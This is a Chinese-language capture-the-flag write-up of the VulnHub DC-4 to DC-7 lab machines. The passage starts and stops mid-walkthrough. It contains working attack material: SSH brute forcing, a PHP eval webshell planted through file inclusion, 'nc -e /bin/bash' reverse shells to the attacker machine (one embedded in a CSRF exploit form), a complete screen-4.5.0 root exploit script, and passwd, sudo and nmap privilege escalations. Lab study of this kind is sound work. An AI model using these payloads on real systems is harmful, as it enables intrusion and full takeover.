![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774698240869-9810404e-6542-4ad6-9d4e-69b72f47a60e.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774698242793-6ed151c8-07f6-4be9-98fb-655f67485ced.png)

命令通过参数radio传递

-->修改参数

**漏洞利用**

**修改传递参数**

改成pwd验证

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774699080833-af7efe61-b7fd-4298-b058-12806038da49.png)

回显成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774699117110-77390dd1-1569-4b1b-8075-4f98225200b0.png)

**getshell**

经过测试尝试发现可以用cat,ls,pwd,不能写文件,不能换目录

**信息收集**

`ls+/home`->`ls+/home/jim`只能查看jim的家目录

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774700289430-5c38e3a1-8633-4411-9770-87b8eb088476.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774700242432-87099669-70e0-4fc8-ad14-235b8f97b9bc.png)

------->`cat+/home/jim/backups/old-passwords.bak`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774700838211-be040be5-30d1-4217-99ad-6f28f5370d5f.png)

找到jim用户以前的密码备份文件

**ssh连接**

**生成字典**

```plain
#将所有密码写出一个字典文件
vim password.txt

对ssh进行爆破
#hydra -l jim -P passord.txt ssh://192.168.43.50 -vV -o hydra.ssh
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774702407703-2938a791-55f3-4e92-9d77-8f6ca5e3f556.png)

密码是jibril04

```plain
ssh jim@192.168.43.50 -p 22
```

**提权**

```plain
ls /var/mail/
#jim

cat /var/mail/jim
```

邮件中来自charlies,密码是^xHhA&hvim0y

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774761780371-e49d7bbb-e53a-4304-a37c-a9d756ed15c4.png)

切换用户

```plain
su charles
#password:^xHhA&hvim0y
```

查看charles有什么权限

```plain
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

发现teehee可以以root运行-->teehee提权

**teehee**提权

```plain
# 添加一个新用户（UID=0，等同于 root）
echo "hacker::0:0::/root:/bin/bash" | sudo teehee -a /etc/passwd

# 切换到这个新用户
su hacker
# 不需要密码，直接获得 root shell
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774762443471-14d6b228-b616-486e-8fc2-33b21776eac4.png)

在家目录中找到flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774762481111-afe81e7f-1ffb-4f7e-aafb-d1959f6fa24d.png)

# DC-5
**信息收集**

**浏览网页**

四个页面:index.php,solutions.php,about-us.php,contact.php



可以写内容-->xss

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774838321154-42276dde-357e-41b4-a85d-ff3f4a2d22e3.png)

**端口扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774838563899-cde7a389-971a-4061-95f7-1b4294fedcce.png)

 111/tcp — rpcbind服务  -->信息泄露

-->已知漏洞

**目录扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774838968738-393cef65-d504-40c2-a516-d0b6261a83a6.png)

```plain
http://192.168.43.51/              # 根目录
http://192.168.43.51/css/          # CSS 样式目录
http://192.168.43.51/images/       # 图片目录  
http://192.168.43.51/index.php     # PHP 入口文件 (4025 字节)
```

**查css内容**

```plain
┌──(root㉿kali)-[~]
└─# curl http://192.168.43.51/css/
<html>
<head><title>403 Forbidden</title></head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.6.2</center>
</body>
</html>

```

nginx/1.6.2-->已知漏洞

**指纹识别**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774839378329-3f1170db-6c18-40ce-84e7-e2d864be9211.png)

**<font style="color:rgb(15, 17, 21);">枚举所有注册的 RPC 服务及其端口</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774839578518-098b6aff-f80d-4dcb-a421-cb7cd6f935d9.png)

<font style="color:rgb(15, 17, 21);">-->可能运行了 NFS 服务</font>

<font style="color:rgb(15, 17, 21);">-->st</font><font style="color:rgb(15, 17, 21);">statd-->已知漏洞</font>

**漏洞扫描挖掘**

在contact页面提交内容,跳转到thankyou.php

[http://192.168.43.51/thankyou.php?firstname=%E4%B8%80&lastname=%E5%86%AF&country=britain&subject=hello+hola+bello%0D%0A](http://192.168.43.51/thankyou.php?firstname=%E4%B8%80&lastname=%E5%86%AF&country=britain&subject=hello+hola+bello%0D%0A)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774840664779-e36fc487-c49b-40e4-9b26-6eeb7d0458ef.png)

发现末尾有CRLF

-->日志注入/伪造

-->crlf注入/http响应拆分

但是用户输入的参数没有出现在响应中,所以不存在crlf注入

--><u>日志注入,但目前还不能验证</u>

**本地文件包含**

扫描时发/footer.php

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774867364797-c77b73b1-ed1b-49d7-82e0-9dd6bf597aad.png)

在此前的/thankyou.php页面也出现这个,猜测有thankyou.php包含footer.php

-->本地文件包含漏洞

**验证**

设置爆破位置

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774869232614-cb2836e1-b3ce-4e55-a0af-71eebd119e94.png)

爆破出参数file

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774869257872-b9f874be-4f9b-473d-8c88-8ec7868cfbaa.png)

验证

文件内容返回在响应体中

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774869392394-b9e1244b-6b2a-4a05-a0ca-c55d8c7c1f10.png)

**getshell**

url注入webshell

`<font style="color:rgb(15, 17, 21);background-color:rgb(237, 243, 254);">GET /thankyou.php?file=<?php eval($_POST[cmd]);?> HTTP/1.1</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774873762431-400ebf19-a4ce-4d6c-bc59-82e118386317.png)

检查是否注入

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774873807489-1b4170db-d99e-467a-b294-64f878982f92.png)

注入成功

蚁剑连接

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774873847200-400fea0a-78a5-4738-a576-03e93a5b4cea.png)

**权限提升**

**反弹shell**

```plain
#开启监听
nc -lvnp 4444


#蚁剑靶机虚拟终端
nc -e /bin/bash 192.168.43.52 4444
```

**信息收集**

查看suid程序

```plain
find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/mount
/bin/umount
/bin/screen-4.5.0
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/sbin/mount.nfs
```

screen-4.5.0-->本地提权漏洞

exim4 <font style="color:rgb(15, 17, 21);">4.84_2-->本地提权漏洞</font>

查看用户信息

```plain
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
dc:x:1000:1000:dc,,,:/home/dc:/bin/bash
mysql:x:108:113:MySQL Server,,,:/nonexistent:/bin/false
```

mysql-->有mysql数据库

dc-->普通用户,有bash shell

sshd-->ssh服务存在

root-->root用户存在

**提权**

**m1:screen-4.5.0提权漏洞**

```plain
# 创建 exploit 脚本
cat > /tmp/screen_root.sh << 'EOF'
#!/bin/bash
# Screen 4.5.0 Local Root Exploit

echo "[+] Creating libhax.c"
cat > /tmp/libhax.c << 'EOC'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] Done! Run /tmp/rootshell to get root\n");
}
EOC

echo "[+] Creating rootshell.c"
cat > /tmp/rootshell.c << 'EOC'
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", 0);
}
EOC

echo "[+] Compiling exploits"
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c

echo "[+] Triggering exploit"
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
EOF

chmod +x /tmp/screen_root.sh
/tmp/screen_root.sh
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774958233800-a7cec3ba-b055-4d45-ab56-f6973c3c50d7.png)

拿到flag

# DC-6
**信息收集**

**浏览网页**

+ wordpress-->可能利用已知漏洞

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775303457331-47dee628-aac9-4ed1-acc1-43f47f0f8642.png)

+ 首页为index.php

**指纹识别**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775303842548-86cf896f-bcd8-46bf-bcfe-c323ed6a3216.png)

+ 站点`http://wordy/`访问正常（200 OK），对应IP为`192.168.43.54`
+ 服务器为**Debian Linux**，Web服务是**Apache 2.4.25**
+ 站点核心是**WordPress 5.1.1**搭建，搭载jQuery 1.12.4，为常规WordPress博客站点

-->已知漏洞

**端口扫描**

`nmap -p- 192.168.43.54`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775304062769-aae8725b-13f0-45a6-9300-c92644e5cdab.png)

22端口->ssh连接

**目录扫描**

dirsearch

```plain
[20:02:51] Scanning:
[20:02:52] 403 -   284B - /.php
[20:02:52] 403 -   285B - /.php3
[20:02:57] 301 -     0B - /index.php  ->  http://wordy/
[20:02:57] 404 -   51KB - /index.php/login/
[20:02:58] 200 -   19KB - /license.txt
[20:02:59] 200 -    7KB - /readme.html
[20:03:00] 403 -   294B - /server-status/
[20:03:00] 403 -   293B - /server-status
[20:03:01] 301 -   301B - /wp-admin  ->  http://wordy/wp-admin/
[20:03:01] 301 -   303B - /wp-content  ->  http://wordy/wp-content/
[20:03:02] 403 -   316B - /wp-content/plugins/akismet/admin.php
[20:03:02] 403 -   318B - /wp-content/plugins/akismet/akismet.php
[20:03:02] 500 -     0B - /wp-content/plugins/hello.php
[20:03:02] 200 -     0B - /wp-content/themes/
[20:03:02] 200 -     0B - /wp-content/
[20:03:02] 200 -   42KB - /wp-includes/
[20:03:02] 301 -   304B - /wp-includes  ->  http://wordy/wp-includes/
[20:03:02] 500 -     0B - /wp-includes/rss-functions.php
[20:03:02] 200 -     0B - /wp-config.php
[20:03:02] 400 -     1B - /wp-admin/admin-ajax.php
[20:03:02] 200 -    1KB - /wp-admin/install.php
[20:03:02] 500 -    3KB - /wp-admin/setup-config.php
[20:03:02] 405 -    42B - /xmlrpc.php
[20:03:02] 302 -     0B - /wp-signup.php  ->  http://wordy/wp-login.php?action=register
[20:03:02] 302 -     0B - /wp-admin/  ->  http://wordy/wp-login.php?redirect_to=http%3A%2F%2Fwordy%2Fwp-admin%2F&reauth=1
[20:03:02] 200 -     0B - /wp-cron.php
[20:03:02] 200 -    3KB - /wp-login.php
```

+ [http://wordy/wp-admin/](http://wordy/wp-admin/)

wp管理员登录页面

-->sql注入/弱口令/爆破/wpscan扫描

**漏洞挖掘扫描**

**管理员登录页面**

**wpscan扫描**

`wpscan --url [http://wordy/](http://wordy/) -e`  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775738445702-d09fe376-74bc-40d1-950c-1cf083aba441.png)

四个非管理员用户

**对用户密码爆破**

`wpscan --url http://wordy -U sarah,graham,mark,jens -P /usr/share/wordlists/rockyou.txt`

字典太大了,根据vulnhub官方提示缩小字典

```plain
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt

wpscan --url http://wordy/ -U sarah,graham,mark,jens -P passwords.txt --max-threads 100
```

爆破结果 Username: mark, Password: helpdesk01

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775739463616-60311ab9-cd3e-4928-ba53-bf09f2641b62.png)

**登录后台**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775739721765-b22865ff-880f-4f17-82d8-4aa0dad351fb.png)

看到插件activity monitor

**查找POC**

```plain
┌──(root㉿kali)-[~]
└─# searchsploit plainview activity monitor
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection                                  | php/webapps/45274.html
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE) (Authenticated) (2)                    | php/webapps/50110.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                            
┌──(root㉿kali)-[~]
└─# searchsploit -x php/webapps/45274.html
  Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection
      URL: https://www.exploit-db.com/exploits/45274
     Path: /usr/share/exploitdb/exploits/php/webapps/45274.html
    Codes: CVE-2018-15877
 Verified: True
File Type: ReStructuredText file, ASCII text
```

粘贴代码poc.html

```plain
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.43.53 9999 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

**验证代码**

1. kali`nc -lvnp 9999`
2. 在浏览器wordy的前提下在同一浏览器访问poc.html
3. 在poc.html点击`submit reques`

<!-- 这是一张图片，ocr 内容为：[-(ROOT&KALI)-[~] -LVNP 9999 NC LISTENING ON [ANY] 9999 [192.168.43.53] FROM (UNKNOWN) [192.168.43.54] 59116 CONNECT TO WHOAMI WWW-DATA -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775910052021-22d4f762-b205-4e18-a3ce-18dfea86a1e8.png)

以及getshell

**内网渗透**

**信息收集**

在mark的家目录发现things-to-do

<!-- 这是一张图片，ocr 内容为：HOME/MARK/STUFF LS THINGS-TO-TXT -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775910372694-74869964-0786-419f-a1e5-40cd96c62506.png)

在jens的家目录发现备份脚本

<!-- 这是一张图片，ocr 内容为：LS HOME/JENS BACKUPS.SH -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775910905906-e93efd85-13c3-4df2-86fe-4dddf565639e.png)

```plain
cat /home/mark/stuff/things-to-do.txt
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

拿到graham的密码

graham:GSo7isUM1D4

**权限提升**

切换到graham

```plain
python -c 'import pty;pty.spawn("/bin/bash")'
su graham
```

切换到jens

```plain
#查看脚本信息
ls -la /home/jens/backups.sh
-rwxrwxr-x 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh
graham@dc-6:/$ cat /home/jens/backups.sh
#在组dev

#查看脚本内容
cat /home/jens/backups.sh
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
#jens可以用/bin/bash执行这个文件

#查看graham是否在dev组中
graham@dc-6:/$ groups graham
groups graham
graham : graham devs
#graham确实可以执行dev

#graham以jens身份塞入bash启动脚本
graham@dc-6:/$ echo "/bin/bash" >> /home/jens/backups.sh
echo "/bin/bash" >> /home/jens/backups.sh
graham@dc-6:/$ sudo -u jens /home/jens/backups.sh
```

切换到root

```plain
#查看可用权限
sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap

# 创建恶意 Lua 脚本
echo 'os.execute("/bin/bash")' > /tmp/shell.nse

# 以 root 身份执行 nmap 加载脚本
sudo nmap --script=/tmp/shell.nse
#获得root权限
```

在root家目录找到flag

<!-- 这是一张图片，ocr 内容为：-6://# CAT ~/THEFLAG.TXT ROOTADC-6:/ DP"YB D8B YB DP 88B 88 888888 88 88888888 8888B YB 88YB88 88 88 DP 81 YB DP 88 YB DB Y8P 88 DP 88 Y88 88" YBDPYBDP 88 81 DY YB 088 88 (8) YBODP 88 Y8 88888 8888Y" YP 888888 8800D8 8800D8 YP CONGRATULATIONS!!!! JUST WANTED THO TO SEND A BIG THANKS THERE TO ALL HOPE YOU ENJOYED DC-6. OUT T HAVE TAKEN TIME TO COMPLETE THESE LITTLE WHOHAVE RE PROVIDED FEEDBACK, AND WE WHO CHALLENGES. IF YOU ENJOYED THIS CTF, A TWEET VIA @DCAU7. SEND ME -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775912682493-8be9fc47-edf6-4c91-b1d8-b3b0fb3c96a6.png)

# DC-7
目标:[http://192.168.43.55/](http://192.168.43.55/)

**信息收集**

**端口扫描**

`nmap -p- 192.168.43.55`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775971441113-f015ccb9-4f7e-4cbe-8ac2-ca3a8fff38db.png)

**目录扫描**

`python dirsearch.py -u [http://192.168.43.55/](http://192.168.43.55/)`

+ `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/node</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/README.txt</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/robots.txt</font>`
+ `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/user/login/</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（用户登录页，10KB）--></font>**<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">弱口令/爆破/sql注入</font>**
+ `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/web.config</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">（IIS 配置文件）</font>
+ <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">后台管理目录：</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/admin</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/administrator</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/webadmin</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 等核心后台均 403，权限封禁</font>
+ <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">敏感文件</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">：</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">.htaccess</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/vendor/</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/server-status</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、各类</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">*.sql</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">数据库备份文件</font>
+ <font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">用户数据：</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/user/0</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">、</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">/user/1</font>`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);"> 等用户 ID 路径 403，禁止访问</font>

**指纹识别**

`whatweb [http://192.168.43.55/](http://192.168.43.55/)`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775971542621-c9e1bcd8-9e11-43a0-9a76-701b821d2a4d.png)

-->利用已知漏洞

| <font style="color:rgb(15, 17, 21);">漏洞名称 / CVE</font> | <font style="color:rgb(15, 17, 21);">影响版本</font> | <font style="color:rgb(15, 17, 21);">核心成因</font> | <font style="color:rgb(15, 17, 21);">利用位置</font> | <font style="color:rgb(15, 17, 21);">备注</font> |
| --- | --- | --- | --- | --- |
| **<font style="color:rgb(15, 17, 21);">Drupalgeddon 2</font>**<font style="color:rgb(15, 17, 21);">   </font>**<font style="color:rgb(15, 17, 21);">(CVE-2018-7600)</font>** | <font style="color:rgb(15, 17, 21);">Drupal</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">6.x, 7.x, 8.x</font>** | <font style="color:rgb(15, 17, 21);">表单 API 在处理</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">#post_render</font>`<br/><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">等渲染数组时未严格过滤，导致未授权 RCE</font> | `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user/register</font>`<br/><font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">等表单</font> | **<font style="color:rgb(15, 17, 21);">DC-7 首选</font>**<font style="color:rgb(15, 17, 21);">。Metasploit 有成熟模块</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">exploit/unix/webapp/drupal_drupalgeddon2</font>` |
| **<font style="color:rgb(15, 17, 21);">Drupalgeddon 3</font>**<font style="color:rgb(15, 17, 21);">   </font>**<font style="color:rgb(15, 17, 21);">(CVE-2018-7602)</font>** | <font style="color:rgb(15, 17, 21);">Drupal</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">7.x, 8.x</font>** | <font style="color:rgb(15, 17, 21);">与 7600 相关，利用 Phar 反序列化实现 RCE</font> | <font style="color:rgb(15, 17, 21);">需结合文件上传或 Phar 流</font> | **<font style="color:rgb(15, 17, 21);">7600 的变种</font>**<font style="color:rgb(15, 17, 21);">。如果 7600 被补，可尝试此漏洞</font> |
| **<font style="color:rgb(15, 17, 21);">Drupalgeddon</font>**<font style="color:rgb(15, 17, 21);">   </font>**<font style="color:rgb(15, 17, 21);">(CVE-2014-3704)</font>** | <font style="color:rgb(15, 17, 21);">Drupal</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">7.x</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">< 7.32</font> | <font style="color:rgb(15, 17, 21);">SQL 注入导致代码执行</font> | <font style="color:rgb(15, 17, 21);">登录表单</font> | **<font style="color:rgb(15, 17, 21);">仅影响 Drupal 7</font>**<font style="color:rgb(15, 17, 21);">。DC-7 是 Drupal 8，此漏洞不适用</font> |
| **<font style="color:rgb(15, 17, 21);">RESTful RCE</font>**<font style="color:rgb(15, 17, 21);">   </font>**<font style="color:rgb(15, 17, 21);">(CVE-2019-6340)</font>** | <font style="color:rgb(15, 17, 21);">Drupal</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">8.5.x</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">< 8.5.11</font><font style="color:rgb(15, 17, 21);">   </font>**<font style="color:rgb(15, 17, 21);">8.6.x</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">< 8.6.10</font> | <font style="color:rgb(15, 17, 21);">RESTful Web Services 模块未严格反序列化数据，导致 RCE</font> | <font style="color:rgb(15, 17, 21);">REST API 端点</font> | <font style="color:rgb(15, 17, 21);">DC-7 如启用了 REST 模块且版本符合，可尝试。无需认证</font> |


**浏览网页**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775971725339-88b7d8d1-c8e1-44ad-a18e-f5f09613bf20.png)

页面输入搜索关键词,发现关键词用get传递

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775971727162-9944ed54-f4ed-4c48-a962-116995fd8c3a.png)

**漏洞挖掘**

**验证已知漏洞**

```plain
search Drupalgeddon 2
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775973198764-5eabe649-28e8-446c-88df-3708a787b81f.png)

```plain
search -m 44448.py
python 44448.py
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775973260562-8e822d23-9663-4563-8d84-5ac8bb89b25f.png)

不可利用-->被修复

**<font style="color:rgb(15, 17, 21);">重新浏览网页</font>**

<font style="color:rgb(15, 17, 21);">底部发现`</font>[@dc7user](https://www.yuque.com/dc7user)<font style="color:rgb(15, 17, 21);">`</font>

<font style="color:rgb(15, 17, 21);">访问github/dc7user,发现数据库配置信息</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775974819592-92a9271b-f1dc-4461-84ab-0ad07972622e.png)

-->登录之前扫描到的的login页面-->登录不成功-->ssh登录

**ssh登录**

```plain
ssh dc7user@192.168.43.55
#密码:MdR3xOgB7#dW
```

已经getshell

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775975094933-1e4f8aed-689d-4ed5-8272-36b7df82101f.png)

**内网渗透**

**信息收集**

```plain
dc7user@dc-7:~$ pwd
/home/dc7user
dc7user@dc-7:~$ ls
backups  mbox
dc7user@dc-7:~$ cat mbox
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1775975472947-ef21130d-faa4-4c84-b3c9-5f05ce518abb.png)

在dc7user的家目录发现backups目录下website.sql.gpg  website.tar.gz.gpg

<!-- 这是一张图片，ocr 内容为： -->
